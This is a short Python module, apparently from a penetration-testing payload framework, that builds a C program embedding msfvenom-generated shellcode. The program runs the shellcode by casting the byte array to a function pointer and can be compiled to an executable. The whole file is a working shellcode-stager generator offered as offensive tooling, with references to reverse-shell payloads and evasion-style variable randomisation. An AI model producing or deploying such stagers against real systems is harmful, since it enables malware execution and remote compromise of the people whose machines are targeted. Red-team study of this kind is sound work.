"""

Simple C void * shellcode invoker.

Code adapted from:
https://github.com/rapid7/metasploit-framework/blob/master/data/templates/src/pe/exe/template.c


module by @christruncer

"""

import string

from modules.common import shellcode
from modules.common import messages
from modules.common import randomizer
from modules.common import crypters
from modules.common import encryption


class Stager:
	
	def __init__(self):
		# required options
		self.shortname = "VoidPointer"
		self.description = "C VoidPointer cast method for inline shellcode injection"
		self.language = "c"
		self.rating = "Poor"
		self.extension = "c"
		
		# options we require user ineraction for- format is {Option : [Value, Description]]}
		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"]}

	def generate(self):
		
		# Generate Shellcode Using msfvenom
		self.shellcode = shellcode.Shellcode()
		Shellcode = self.shellcode.generate()

		# Generate Random Variable Names
		RandShellcode = randomizer.randomString()
		RandReverseShell = randomizer.randomString()
		RandMemoryShell = randomizer.randomString()

		# Start creating our C payload
		PayloadCode = 'unsigned char payload[]=\n'
		PayloadCode += '\"' + Shellcode + '\";\n'
		PayloadCode += 'int main(void) { ((void (*)())payload)();}\n'
		
		return PayloadCode
